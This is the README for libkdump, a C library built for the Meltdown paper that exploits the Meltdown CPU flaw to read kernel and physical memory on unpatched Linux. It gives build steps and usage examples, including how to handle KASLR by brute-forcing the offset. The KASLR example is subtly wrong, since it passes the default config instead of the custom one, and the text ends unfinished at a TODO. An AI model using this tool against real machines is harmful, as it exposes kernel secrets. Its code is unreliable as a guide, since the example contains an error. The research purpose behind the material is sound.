# libkdump

libkdump is a library to exploit the [Meltdown bug](https://meltdown.help). It allows to easily read kernel memory and physical memory on affected CPUs. 

libkdump was developed for the paper 
 
 * [Meltdown](https://meltdown.help/meltdown.pdf) by Lipp, Schwarz, Gruss, Prescher, Haas, Mangard, Kocher, Genkin, Yarom, and Hamburg
 
 and was used to run several experiments and evaluations. 
 
libkdump supports a wide range of CPUs by automatically adapting most parameters to the current execution environment. 
libkdump was tested on Ubuntu 16.04.3, both with an Intel Core i7-6700K and an Intel Xeon E5-2650 v4, but it should work on every Linux which does not have [KPTI](https://en.wikipedia.org/wiki/Kernel_page-table_isolation) enabled. 

## Build

The library is shipped with a Makefile and can be compiled by running:

```
make
```

This produces both a shared library (`libkdump.so`) and a static library (`libkdump.a`).

### Dependenies

libkdump does not have any dependencies. 

## Install

libkdump can be installed system by running
```
sudo make install
```
and uninstalled by running
```
sudo make uninstall
```


## Usage

This section gives a short overview of how to use libkdump. For a complete documentation, please refer to the source code and the demo applications. 

### Initialization and Cleanup

To use libkdump, include the `libkdump.h` header and initialize libkdump using `libkdump_init`. When done, call `libkdump_cleanup` to revert everything to the way it was before using libkdump. 

#### Example 

```
#include "libkdump.h"

int main() {
	// initialize libkdump
	if(libkdump_init(libkdump_auto_config) != 0) {
		return -1;
	}

	// use libkdump...
	
	// done, cleanup everything
	if(libkdump_cleanup() != 0) {
		return -1;
	}
	return 0;
}
```

Compile and link with libkdump (static)
```
gcc example.c -L. -static -lkdump -pthread
```
or as shared library
```
gcc example.c -lkdump
```

### Reading kernel memory

libkdump provides `libkdump_read` as a simple function to read the content of any virtual address. This is independent of whether the virtual address is accessible (user space address) or inaccessible (kernel space address). 

#### Example

```
size_t addr = 0xfffffffc00022a0ull;
// read the (kernel) address
int value = libkdump_read(addr);
// output result
printf("%c\n", value);
```
### Reading physical memory

To read physical memory, libkdump relies on the direct physical map of Linux which is located at `0xffff 8800 0000 0000` if KASLR is disabled. 

If KASLR is disabled (e.g., due to an older kernel version, or the `nokaslr` kernel command line), reading physical memory is as simple as calling `libkdump_phys_to_virt` on the physical address. The function returns a virtual address for the physical address, which can then be used with `libkdump_read`.

If KASLR is enabled, you have to provide the randomized offset of the direct physical map to libkdump in the initialization (see Example (KASLR)). As the offset does only change with a reboot, it is sufficient to brute-force the offset once (see the kaslr demo or the paper). This takes usually only a few seconds. 

#### Example (no KASLR)
```
// read memory at physical offset 1GB
size_t phys_addr = 1024 * 1024 * 1024; // 1GB
// convert to virtual address
size_t vaddr = libkdump_phys_to_virt(phys_addr);
// read the virtual address
int value = libkdump_read(vaddr);
// output result
printf("%c\n", value);
```

#### Example (KASLR)
```
// custom config for libkdump
libkdump_config_t config;
// set sane defaults
config = libkdump_get_autoconfig();
// change address of direct physical map
config.physical_offset = 0xffff98a000000000ull;
// initialize libkdump with custom config
if(libkdump_init(libkdump_auto_config) != 0) {
	return -1;
}

// read memory at physical offset 1GB
size_t phys_addr = 1024 * 1024 * 1024; // 1GB
// convert to virtual address
size_t vaddr = libkdump_phys_to_virt(phys_addr);
// read the virtual address
int value = libkdump_read(vaddr);
// output result
printf("%c\n", value);
```

### Advanced Configuration

In some cases, the auto configuration of libkdump might not be sufficient (e.g., in the case of KASLR). Thus, libkdump allows to either specify all configuration options manually, or adapt all options after the auto configuration. Furthermore, libkdump also has some compile-time configurations which cannot be changed during runtime. 

#### Runtime configuration

Most options of libkdump can be changed at runtime. All these options are configurable via the `libkdump_config_t` struct that is passed to the `libkdump_init` function. 

The recommended way TODO

#### Compile-time configuration


